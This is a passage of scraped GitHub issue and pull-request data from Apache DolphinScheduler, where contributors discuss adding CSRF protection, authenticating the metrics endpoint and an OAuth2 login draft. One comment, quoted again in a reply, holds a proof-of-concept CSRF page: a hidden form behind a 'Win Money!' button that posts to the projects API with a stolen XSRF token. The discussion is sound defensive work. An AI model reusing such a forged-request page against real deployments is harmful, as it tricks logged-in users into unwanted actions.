                        "body": "> please assign to me if no one is implementing it @EricGao888\r\n\r\n@hdygxsj Great! Thanks for helping out : )",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-28T14:32:54Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1329214027"
                    },
                    {
                        "body": "At present, the following technical details need to be discussed\r\n**1.Whether it is necessary to introduce spring security dependencies on the back end to make dolphinscheduler safe from csrf attacks**\r\nThe spring security csrf module does the following\r\n* If the cookie in the request does not contain a CSRF-TOKEN, a CSRF-TOKEN is generated and a set cookie is added to the request\r\n\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CsrfFilter</div>\r\n\r\n```java\r\n                CsrfToken csrfToken = this.tokenRepository.loadToken(request);\r\n\t\tboolean missingToken = (csrfToken == null);\r\n\t\tif (missingToken) {\r\n\t\t\tcsrfToken = this.tokenRepository.generateToken(request);\r\n\t\t\tthis.tokenRepository.saveToken(csrfToken, request, response);\r\n\t\t}\r\n```\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CookieCsrfTokenRepository</div>\r\n\r\n```java\r\n        @Override\r\n\tpublic void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) {\r\n\t\tString tokenValue = (token != null) ? token.getToken() : \"\";\r\n\t\tCookie cookie = new Cookie(this.cookieName, tokenValue);\r\n\t\tcookie.setSecure((this.secure != null) ? this.secure : request.isSecure());\r\n\t\tcookie.setPath(StringUtils.hasLength(this.cookiePath) ? this.cookiePath : this.getRequestContext(request));\r\n\t\tcookie.setMaxAge((token != null) ? this.cookieMaxAge : 0);\r\n\t\tcookie.setHttpOnly(this.cookieHttpOnly);\r\n\t\tif (StringUtils.hasLength(this.cookieDomain)) {\r\n\t\t\tcookie.setDomain(this.cookieDomain);\r\n\t\t}\r\n\t\tresponse.addCookie(cookie);\r\n\t}\r\n```\r\n* Determine whether the request path needs to be protected by CSRF\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CsrfFilter</div>\r\n\r\n```java\r\n              if (!this.requireCsrfProtectionMatcher.matches(request)) {\r\n\t\t\tif (this.logger.isTraceEnabled()) {\r\n\t\t\t\tthis.logger.trace(\"Did not protect against CSRF since request did not match \"\r\n\t\t\t\t\t\t+ this.requireCsrfProtectionMatcher);\r\n\t\t\t}\r\n\t\t\tfilterChain.doFilter(request, response);\r\n\t\t\treturn;\r\n\t\t}\r\n```\r\n* Compare the CSRF token in the cookie with the CSRF token in the http request header or the token in the http request param\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CsrfFilter</div>\r\n\r\n```java\r\n               String actualToken = request.getHeader(csrfToken.getHeaderName());\r\n\t\tif (actualToken == null) {\r\n\t\t\tactualToken = request.getParameter(csrfToken.getParameterName());\r\n\t\t}\r\n\t\tif (!equalsConstantTime(csrfToken.getToken(), actualToken)) {\r\n\t\t\tthis.logger.debug(\r\n\t\t\t\t\tLogMessage.of(() -> \"Invalid CSRF token found for \" + UrlUtils.buildFullRequestUrl(request)));\r\n\t\t\tAccessDeniedException exception = (!missingToken) ? new InvalidCsrfTokenException(csrfToken, actualToken)\r\n\t\t\t\t\t: new MissingCsrfTokenException(actualToken);\r\n\t\t\tthis.accessDeniedHandler.handle(request, response, exception);\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tfilterChain.doFilter(request, response);\r\n```\r\n\r\nIf we don't introduce spring security in the future, we can also implement csrf defense by adding a filter similar to CsrfFilter\r\n\r\n**2.How do we save the csrf token to prevent attackers from stealing it**\r\n* Whether we implement interceptors ourselves on the back end or use spring security, on the front end we need to think about how to store csrf tokens securely to prevent attackers from stealing them so that csrf defenses fail.\r\n\r\nI found that after calling the login interface, the front end would save the sessionId returned after successful login into the cookie again, and the cookie saved in this way instead of the set-cookie in the http response header would be stolen by other websites\r\n\r\n<div align=\"center\"> code snippet in use-login.ts</div>\r\n\r\n```ts\r\n  const handleLogin = () => {\r\n    state.loginFormRef.validate(async (valid: any) => {\r\n      if (!valid) {\r\n        const loginRes: LoginRes = await login({ ...state.loginForm })\r\n        debugger\r\n        await userStore.setSessionId(loginRes.sessionId)\r\n        await userStore.setSecurityConfigType(loginRes.securityConfigType)\r\n        cookies.set('sessionId', loginRes.sessionId, { path: '/' })\r\n       ……\r\n      }\r\n    })\r\n  }\r\n```\r\n\r\nThis results in an attacker using the following code for a csrf attack, as shown below\r\n```tsx\r\nimport { defineComponent, ref } from \"vue\";\r\nimport cookies from 'js-cookie'\r\n\r\nexport default defineComponent({\r\n  setup() {\r\n    const csrfToken = cookies.get('XSRF-TOKEN')\r\n    return {\r\n      csrfToken\r\n    }\r\n  },\r\n  render() {\r\n    return (<div><form action=\"http://127.0.0.1:5173/dolphinscheduler/projects\" method=\"post\">\r\n      <input type=\"hidden\"\r\n        name=\"projectName\"\r\n        value=\"aasdasd\" />\r\n      <input type=\"hidden\"\r\n        name=\"userName\"\r\n        value=\"admin\" />\r\n      <input type=\"submit\"\r\n        value=\"Win Money!\" />\r\n      <input type=\"hidden\" name=\"_csrf\" value={this.csrfToken}></input>\r\n    </form></div>)\r\n  }\r\n})\r\n```\r\n![1671536386598](https://user-images.githubusercontent.com/35210666/208658487-6c8f9d6d-3072-4d3c-beee-442a06b9181c.png)\r\n\r\nOnce the dolphinscheduler user clicks the button in the diagram, a csrf attack completes\r\n\r\n![1671536625047](https://user-images.githubusercontent.com/35210666/208659235-10bcfbc8-95ef-4a83-bd71-5a99a1b18555.png)\r\n\r\nMaybe we can save the csrf token in pinia, but I'm not sure there is any risk that pinia will be stolen by other websites\r\n\r\n* In order to make csrf token more secure, do we need to consider the encryption of csrf token?\r\n\r\nThe front end places the csrf token in the header or parameter. The back end uses the public key to decrypt the csrf Token in the http request and compares it to the token in the cookie\r\n\r\n**3.Whether to perform csrf defense on login requests**\r\n\r\nAs mentioned in spring security, an attacker can forge login requests to obtain csrf token for subsequent attacks, but our login api must input the username and password.    In my opinion, when the attacker has obtained the username and password, he can directly log in from the website, at this point, the csrf defense is meaningless\r\n\r\n\r\n",
                        "user": "hdygxsj",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-12-20T12:54:46Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1359312576"
                    },
                    {
                        "body": "> At present, the following technical details need to be discussed **1.Whether it is necessary to introduce spring security dependencies on the back end to make dolphinscheduler safe from csrf attacks** The spring security csrf module does the following\r\n> \r\n> * If the cookie in the request does not contain a CSRF-TOKEN, a CSRF-TOKEN is generated and a set cookie is added to the request\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CsrfFilter\r\n> ```java\r\n>                 CsrfToken csrfToken = this.tokenRepository.loadToken(request);\r\n> \t\tboolean missingToken = (csrfToken == null);\r\n> \t\tif (missingToken) {\r\n> \t\t\tcsrfToken = this.tokenRepository.generateToken(request);\r\n> \t\t\tthis.tokenRepository.saveToken(csrfToken, request, response);\r\n> \t\t}\r\n> ```\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CookieCsrfTokenRepository\r\n> ```java\r\n>         @Override\r\n> \tpublic void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) {\r\n> \t\tString tokenValue = (token != null) ? token.getToken() : \"\";\r\n> \t\tCookie cookie = new Cookie(this.cookieName, tokenValue);\r\n> \t\tcookie.setSecure((this.secure != null) ? this.secure : request.isSecure());\r\n> \t\tcookie.setPath(StringUtils.hasLength(this.cookiePath) ? this.cookiePath : this.getRequestContext(request));\r\n> \t\tcookie.setMaxAge((token != null) ? this.cookieMaxAge : 0);\r\n> \t\tcookie.setHttpOnly(this.cookieHttpOnly);\r\n> \t\tif (StringUtils.hasLength(this.cookieDomain)) {\r\n> \t\t\tcookie.setDomain(this.cookieDomain);\r\n> \t\t}\r\n> \t\tresponse.addCookie(cookie);\r\n> \t}\r\n> ```\r\n> \r\n> * Determine whether the request path needs to be protected by CSRF\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CsrfFilter\r\n> ```java\r\n>               if (!this.requireCsrfProtectionMatcher.matches(request)) {\r\n> \t\t\tif (this.logger.isTraceEnabled()) {\r\n> \t\t\t\tthis.logger.trace(\"Did not protect against CSRF since request did not match \"\r\n> \t\t\t\t\t\t+ this.requireCsrfProtectionMatcher);\r\n> \t\t\t}\r\n> \t\t\tfilterChain.doFilter(request, response);\r\n> \t\t\treturn;\r\n> \t\t}\r\n> ```\r\n> \r\n> * Compare the CSRF token in the cookie with the CSRF token in the http request header or the token in the http request param\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CsrfFilter\r\n> ```java\r\n>                String actualToken = request.getHeader(csrfToken.getHeaderName());\r\n> \t\tif (actualToken == null) {\r\n> \t\t\tactualToken = request.getParameter(csrfToken.getParameterName());\r\n> \t\t}\r\n> \t\tif (!equalsConstantTime(csrfToken.getToken(), actualToken)) {\r\n> \t\t\tthis.logger.debug(\r\n> \t\t\t\t\tLogMessage.of(() -> \"Invalid CSRF token found for \" + UrlUtils.buildFullRequestUrl(request)));\r\n> \t\t\tAccessDeniedException exception = (!missingToken) ? new InvalidCsrfTokenException(csrfToken, actualToken)\r\n> \t\t\t\t\t: new MissingCsrfTokenException(actualToken);\r\n> \t\t\tthis.accessDeniedHandler.handle(request, response, exception);\r\n> \t\t\treturn;\r\n> \t\t}\r\n> \t\tfilterChain.doFilter(request, response);\r\n> ```\r\n> \r\n> If we don't introduce spring security in the future, we can also implement csrf defense by adding a filter similar to CsrfFilter\r\n> \r\n> **2.How do we save the csrf token to prevent attackers from stealing it**\r\n> \r\n> * Whether we implement interceptors ourselves on the back end or use spring security, on the front end we need to think about how to store csrf tokens securely to prevent attackers from stealing them so that csrf defenses fail.\r\n> \r\n> I found that after calling the login interface, the front end would save the sessionId returned after successful login into the cookie again, and the cookie saved in this way instead of the set-cookie in the http response header would be stolen by other websites\r\n> \r\n> code snippet in use-login.ts\r\n> ```ts\r\n>   const handleLogin = () => {\r\n>     state.loginFormRef.validate(async (valid: any) => {\r\n>       if (!valid) {\r\n>         const loginRes: LoginRes = await login({ ...state.loginForm })\r\n>         debugger\r\n>         await userStore.setSessionId(loginRes.sessionId)\r\n>         await userStore.setSecurityConfigType(loginRes.securityConfigType)\r\n>         cookies.set('sessionId', loginRes.sessionId, { path: '/' })\r\n>        ……\r\n>       }\r\n>     })\r\n>   }\r\n> ```\r\n> \r\n> This results in an attacker using the following code for a csrf attack, as shown below\r\n> \r\n> ```tsx\r\n> import { defineComponent, ref } from \"vue\";\r\n> import cookies from 'js-cookie'\r\n> \r\n> export default defineComponent({\r\n>   setup() {\r\n>     const csrfToken = cookies.get('XSRF-TOKEN')\r\n>     return {\r\n>       csrfToken\r\n>     }\r\n>   },\r\n>   render() {\r\n>     return (<div><form action=\"http://127.0.0.1:5173/dolphinscheduler/projects\" method=\"post\">\r\n>       <input type=\"hidden\"\r\n>         name=\"projectName\"\r\n>         value=\"aasdasd\" />\r\n>       <input type=\"hidden\"\r\n>         name=\"userName\"\r\n>         value=\"admin\" />\r\n>       <input type=\"submit\"\r\n>         value=\"Win Money!\" />\r\n>       <input type=\"hidden\" name=\"_csrf\" value={this.csrfToken}></input>\r\n>     </form></div>)\r\n>   }\r\n> })\r\n> ```\r\n> \r\n> ![1671536386598](https://user-images.githubusercontent.com/35210666/208658487-6c8f9d6d-3072-4d3c-beee-442a06b9181c.png)\r\n> \r\n> Once the dolphinscheduler user clicks the button in the diagram, a csrf attack completes\r\n> \r\n> ![1671536625047](https://user-images.githubusercontent.com/35210666/208659235-10bcfbc8-95ef-4a83-bd71-5a99a1b18555.png)\r\n> \r\n> Maybe we can save the csrf token in pinia, but I'm not sure there is any risk that pinia will be stolen by other websites\r\n> \r\n> * In order to make csrf token more secure, do we need to consider the encryption of csrf token?\r\n> \r\n> The front end places the csrf token in the header or parameter. The back end uses the public key to decrypt the csrf Token in the http request and compares it to the token in the cookie\r\n> \r\n> **3.Whether to perform csrf defense on login requests**\r\n> \r\n> As mentioned in spring security, an attacker can forge login requests to obtain csrf token for subsequent attacks, but our login api must input the username and password. In my opinion, when the attacker has obtained the username and password, he can directly log in from the website, at this point, the csrf defense is meaningless\r\n\r\nFor question 2，Pinia will store `csrfToken ` in localStorage and will not be stolen by other websites. Your attack succeeded because you deployed them on the same domain -- `127.0.0.1`.",
                        "user": "devosend",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-04T11:26:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1370806088"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/12563",
                "title": "[Improvement][Security] Enable authentication for metrics url",
                "labels": [
                    "improvement",
                    "priority:high",
                    "security"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 12563,
                "id": 1425078848,
                "state": "open",
                "project_created_at": "2022-10-27T06:01:17Z",
                "closed_at": null,
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\n* Currently, users could get the list of DS metrics without login by sending a get request to `http://ip:12345/dolphinscheduler/actuator/prometheus`, which may lead to potential security problems.\n\n### Are you willing to submit a PR?\n\n- [X] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-10-27T06:06:50Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12563#issuecomment-1293037941"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/pull/12549",
                "title": "[Feature][Authenticator] Add OAuth2 authenticator ",
                "labels": [
                    "feature",
                    "backend",
                    "don't merge",
                    "miss:docs",
                    "security",
                    "miss:ui",
                    "miss:tests"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 12549,
                "id": 1423781992,
                "state": "closed",
                "project_created_at": "2022-10-26T10:17:45Z",
                "closed_at": "2022-11-30T07:36:13Z",
                "body": "## Purpose of the pull request\r\n\r\n* Still WIP, just a draft, a few things need to be fixed.\r\n\r\n* This PR closes: #11242 \r\n\r\n## Brief change log\r\n\r\n* Add OAuth2 authenticator \r\n\r\n## Verify this pull request\r\n\r\n* WIP",
                "comments": [
                    {
                        "body": "Hello, I'm trying to add a new authenticator for DS to support OAuth2.0. Currently I'm blocked by some kind of cookie missing issue. After calling `http://localhost:12345/dolphinscheduler/testlogin/google`, I get successfully redirected to google login page and completedthe OAuth process. I could see the `sessionId` in browser.\r\n![image](https://user-images.githubusercontent.com/34905992/198209678-92d3422e-9a13-45db-a21f-df39aebc421b.png)\r\nHowever, if I try to visit `http://localhost:12345/dolphinscheduler/ui/projects`, the `sessionId` is missing and I get blocked by `LoginHandlerInterceptor`. I'm wondering whether it is caused by the wrong path or some other stuff related to cookie since I haven't implemented the front-end part of `/testlogin/google`\r\n\r\nSo I have two questions:\r\n\r\n1. Am I supposed to handle the cookie path in front-end part so that the cookie added by back-end could be sent to /ui/**?\r\n2. Since Spring Boot has its default interceptor for OAuth2.0, should I disabled `ds LoginHandlerInterceptor` when using OAuth2.0?\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-ui/src/views/login/index.tsx#L35-L52\r\n\r\nRelated information:\r\n\r\nAfter authentication, ds will put `sessionId` into cookies and check the `sessionId` in `preHandle` method of `LoginHandlerInterceptor`, as shown below:\r\nhttps://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/security/impl/AbstractAuthenticator.java#L82-L100\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/interceptor/LoginHandlerInterceptor.java#L69-L74\r\n\r\nAs we could see in `LoginController`, the url for login is `/login` and will be mapped to `/ui/login` https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/controller/LoginController.java#L83\r\n\r\nBut in my test code, I added a new url for login which is `/testlogin/google` without front-end. And it could not be mapped to `/ui/testlogin/google`.\r\n![image](https://user-images.githubusercontent.com/34905992/198208457-7799366c-3b62-41ac-8f5b-a91e60d4c8b1.png)\r\n\r\n@kezhenxu94 @devosend Could u plz help take a look when available? Thanks!",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-10-27T06:50:55Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1293072548"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/apache/dolphinscheduler/pull/12549?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) Report\n> Merging [#12549](https://codecov.io/gh/apache/dolphinscheduler/pull/12549?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (53340fc) into [dev](https://codecov.io/gh/apache/dolphinscheduler/commit/70aef3ec21aa712f1f499f7b9b56bdb6b803d654?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (70aef3e) will **decrease** coverage by `0.32%`.\n> The diff coverage is `39.10%`.\n\n> :exclamation: Current head 53340fc differs from pull request most recent head bbe3bd3. Consider uploading reports for the commit bbe3bd3 to get more accurate results\n\n```diff\n@@             Coverage Diff              @@\n##                dev   #12549      +/-   ##\n============================================\n- Coverage     39.38%   39.05%   -0.33%     \n+ Complexity     4214     4175      -39     \n============================================\n  Files          1040     1044       +4     \n  Lines         39158    39289     +131     \n  Branches       4482     4501      +19     \n============================================\n- Hits          15423    15346      -77     \n- Misses        21958    22208     +250     \n+ Partials       1777     1735      -42     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/dolphinscheduler/pull/12549?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | Coverage Δ | |\n|---|---|---|\n| [...in/alert/dingtalk/DingTalkAlertChannelFactory.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1kaW5ndGFsay9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZGluZ3RhbGsvRGluZ1RhbGtBbGVydENoYW5uZWxGYWN0b3J5LmphdmE=) | `98.79% <ø> (ø)` | |\n| [...cheduler/plugin/alert/dingtalk/DingTalkSender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1kaW5ndGFsay9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZGluZ3RhbGsvRGluZ1RhbGtTZW5kZXIuamF2YQ==) | `34.91% <0.00%> (ø)` | |\n| [...r/plugin/alert/email/EmailAlertChannelFactory.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvRW1haWxBbGVydENoYW5uZWxGYWN0b3J5LmphdmE=) | `98.82% <ø> (ø)` | |\n| [...olphinscheduler/plugin/alert/email/ExcelUtils.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvRXhjZWxVdGlscy5qYXZh) | `81.63% <ø> (ø)` | |\n| [...olphinscheduler/plugin/alert/email/MailSender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvTWFpbFNlbmRlci5qYXZh) | `50.68% <ø> (ø)` | |\n| [...ugin/alert/email/template/DefaultHTMLTemplate.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvdGVtcGxhdGUvRGVmYXVsdEhUTUxUZW1wbGF0ZS5qYXZh) | `79.24% <ø> (ø)` | |\n| [...plugin/alert/feishu/FeiShuAlertChannelFactory.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1mZWlzaHUvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL2FsZXJ0L2ZlaXNodS9GZWlTaHVBbGVydENoYW5uZWxGYWN0b3J5LmphdmE=) | `97.36% <ø> (ø)` | |\n| [...dolphinscheduler/plugin/alert/http/HttpSender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1odHRwL3NyYy9tYWluL2phdmEvb3JnL2FwYWNoZS9kb2xwaGluc2NoZWR1bGVyL3BsdWdpbi9hbGVydC9odHRwL0h0dHBTZW5kZXIuamF2YQ==) | `47.69% <ø> (ø)` | |\n| [...eduler/plugin/alert/pagerduty/PagerDutySender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1wYWdlcmR1dHkvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL2FsZXJ0L3BhZ2VyZHV0eS9QYWdlckR1dHlTZW5kZXIuamF2YQ==) | `66.07% <ø> (ø)` | |\n| [...eduler/plugin/alert/script/ScriptAlertChannel.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1zY3JpcHQvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL2FsZXJ0L3NjcmlwdC9TY3JpcHRBbGVydENoYW5uZWwuamF2YQ==) | `16.66% <0.00%> (ø)` | |\n| ... and [231 more](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | |\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-10-27T07:00:37Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1293080788"
                    },
                    {
                        "body": "> Hello, I'm trying to add a new authenticator for DS to support OAuth2.0. Currently I'm blocked by some kind of cookie missing issue. After calling `http://localhost:12345/dolphinscheduler/testlogin/google`, I get successfully redirected to google login page and completedthe OAuth process. I could see the `sessionId` in browser. ![image](https://user-images.githubusercontent.com/34905992/198209678-92d3422e-9a13-45db-a21f-df39aebc421b.png) However, if I try to visit `http://localhost:12345/dolphinscheduler/ui/projects`, the `sessionId` is missing and I get blocked by `LoginHandlerInterceptor`. I'm wondering whether it is caused by the wrong path or some other stuff related to cookie since I haven't implemented the front-end part of `/testlogin/google`\r\n> \r\n> So I have two questions:\r\n> \r\n> 1. Am I supposed to handle the cookie path in front-end part so that the cookie added by back-end could be sent to /ui/**?\r\n> 2. Since Spring Boot has its default interceptor for OAuth2.0, should I disabled `ds LoginHandlerInterceptor` when using OAuth2.0?\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-ui/src/views/login/index.tsx#L35-L52\r\n> \r\n> Related information:\r\n> \r\n> After authentication, ds will put `sessionId` into cookies and check the `sessionId` in `preHandle` method of `LoginHandlerInterceptor`, as shown below:\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/security/impl/AbstractAuthenticator.java#L82-L100\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/interceptor/LoginHandlerInterceptor.java#L69-L74\r\n> \r\n> As we could see in `LoginController`, the url for login is `/login` and will be mapped to `/ui/login`\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/controller/LoginController.java#L83\r\n> \r\n> But in my test code, I added a new url for login which is `/testlogin/google` without front-end. And it could not be mapped to `/ui/testlogin/google`. ![image](https://user-images.githubusercontent.com/34905992/198208457-7799366c-3b62-41ac-8f5b-a91e60d4c8b1.png)\r\n> \r\n> @kezhenxu94 @devosend Could u plz help take a look when available? Thanks!\r\n\r\nProblems solved, thanks for the help : ) ",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-10-27T13:17:51Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1293514424"
                    },
                    {
